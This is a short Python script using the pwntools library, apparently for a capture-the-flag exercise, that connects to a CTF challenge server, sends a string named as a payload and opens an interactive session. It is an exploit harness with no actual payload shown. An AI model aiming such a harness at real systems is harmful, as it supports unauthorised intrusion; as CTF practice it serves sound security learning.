from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('csie.ctf.tw', 10120)
r.send('./payload')
r.interactive()
